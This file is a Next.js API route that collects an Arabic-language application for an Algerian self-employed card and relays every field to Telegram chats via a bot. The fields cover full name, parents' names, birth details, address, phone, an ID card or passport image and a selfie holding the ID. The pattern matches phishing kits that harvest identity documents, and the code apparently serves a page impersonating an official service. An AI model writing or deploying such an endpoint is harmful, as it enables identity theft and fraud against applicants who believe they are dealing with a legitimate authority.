import { NextRequest, NextResponse } from 'next/server'

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN!
const CHAT_IDS  = (process.env.TELEGRAM_CHAT_ID ?? '').split(',').map(s => s.trim()).filter(Boolean)
const TG        = `https://api.telegram.org/bot${BOT_TOKEN}`

async function sendMessage(chatId: string, text: string) {
  await fetch(`${TG}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML' }),
  })
}

async function sendFile(chatId: string, file: File, caption: string) {
  const fd = new FormData()
  fd.append('chat_id', chatId)
  fd.append('caption', caption)
  fd.append('document', file)
  await fetch(`${TG}/sendDocument`, { method: 'POST', body: fd })
}

export async function POST(req: NextRequest) {
  if (!BOT_TOKEN || CHAT_IDS.length === 0) {
    return NextResponse.json({ error: 'Telegram not configured' }, { status: 500 })
  }

  const fd = await req.formData()

  const fullName    = fd.get('fullName')    as string
  const fatherName  = fd.get('fatherName')  as string
  const motherName  = fd.get('motherName')  as string
  const dob         = fd.get('dob')         as string
  const pob         = fd.get('pob')         as string
  const wilaya      = fd.get('wilaya')      as string
  const commune     = fd.get('commune')     as string
  const address     = fd.get('address')     as string
  const phone       = fd.get('phone')       as string
  const email       = fd.get('email')       as string
  const activity    = fd.get('activity')    as string

  const photo  = fd.get('photo')  as File | null
  const idCard = fd.get('idCard') as File | null
  const selfie = fd.get('selfie') as File | null

  const now = new Date().toLocaleString('fr-DZ', { timeZone: 'Africa/Algiers' })

  const message = `
🆕 <b>طلب بطاقة مقاول ذاتي جديد</b>
🕒 ${now}

👤 <b>المعلومات الشخصية:</b>
• الاسم الكامل: <b>${fullName}</b>
• اسم الأب: ${fatherName}
• اسم الأم: ${motherName}
• تاريخ الميلاد: ${dob}
• مكان الميلاد: ${pob}

📍 <b>العنوان:</b>
• الولاية: ${wilaya}
• البلدية: ${commune}
• العنوان: ${address}

📞 <b>التواصل:</b>
• الهاتف: ${phone}${email ? `\n• البريد: ${email}` : ''}

💼 <b>النشاط المراد:</b> ${activity}
  `.trim()

  try {
    for (const id of CHAT_IDS) {
      await sendMessage(id, message)
      if (photo)  await sendFile(id, photo,  '📸 الصورة الشخصية')
      if (idCard) await sendFile(id, idCard, '🪪 بطاقة التعريف / جواز السفر')
      if (selfie) await sendFile(id, selfie, '🤳 السيلفي مع البطاقة')
    }

    return NextResponse.json({ ok: true })
  } catch (err) {
    console.error('Telegram send error:', err)
    return NextResponse.json({ error: 'Failed to send' }, { status: 500 })
  }
}
